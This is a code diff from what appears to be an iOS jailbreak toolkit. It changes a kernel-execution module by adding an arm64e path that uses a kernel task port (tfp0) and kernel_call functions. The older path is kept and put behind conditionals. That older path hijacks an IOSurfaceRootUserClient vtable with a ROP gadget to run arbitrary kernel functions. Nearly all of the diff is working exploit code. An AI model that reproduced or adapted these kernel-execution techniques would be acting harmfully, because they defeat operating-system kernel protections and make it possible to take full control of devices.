@@ -4,6 +4,11 @@
 #include "kexecute.h"
 #include "kmem.h"
 #include "offsetof.h"
+#include "common.h"
+#include "kernel_call.h"
+#include "parameters.h"
+#include "kc_parameters.h"
+#include "kernel_memory.h"
 
 mach_port_t prepare_user_client() {
     kern_return_t err;
@@ -11,18 +16,18 @@ mach_port_t prepare_user_client() {
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     
     if (service == IO_OBJECT_NULL) {
-        printf(" [-] unable to find service\n");
+        DEBUGLOG(false, "[-] unable to find service\n");
         exit(EXIT_FAILURE);
     }
     
     err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
     if (err != KERN_SUCCESS) {
-        printf(" [-] unable to get user client connection\n");
+        DEBUGLOG(false, "[-] unable to get user client connection\n");
         exit(EXIT_FAILURE);
     }
     
     
-    printf("got user client: 0x%x\n", user_client);
+    DEBUGLOG(false, "got user client: 0x%x\n", user_client);
     return user_client;
 }
 
@@ -36,6 +41,13 @@ static uint64_t fake_client;
 const int fake_kalloc_size = 0x1000;
 
 void init_kexecute() {
+#if __arm64e__
+    parameters_init();
+    kernel_task_port = tfp0;
+    current_task = rk64(find_port(mach_task_self()) + offsetof_ip_kobject);
+    kernel_task = rk64(offset_kernel_task);
+    kernel_call_init();
+#else
     user_client = prepare_user_client();
     
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
@@ -72,18 +84,26 @@ void init_kexecute() {
     
     // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
     wk64(fake_vtable+8*0xB7, offset_add_ret_gadget);
-    
+#endif
     pthread_mutex_init(&kexecute_lock, NULL);
 }
 
 void term_kexecute() {
+#if __arm64e__
+    kernel_call_deinit();
+#else
     wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, IOSurfaceRootUserClient_addr);
     kfree(fake_vtable, fake_kalloc_size);
     kfree(fake_client, fake_kalloc_size);
+#endif
 }
 
 uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
     pthread_mutex_lock(&kexecute_lock);
+    uint64_t returnval = 0;
+#if __arm64e__
+    returnval = kernel_call_7(addr, 7, x0, x1, x2, x3, x4, x5, x6);
+#else
     
     // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
     // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
@@ -99,9 +119,10 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
     uint64_t offx28 = rk64(fake_client+0x48);
     wk64(fake_client+0x40, x0);
     wk64(fake_client+0x48, addr);
-    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+    returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
     wk64(fake_client+0x40, offx20);
     wk64(fake_client+0x48, offx28);
+#endif
     
     pthread_mutex_unlock(&kexecute_lock);
     
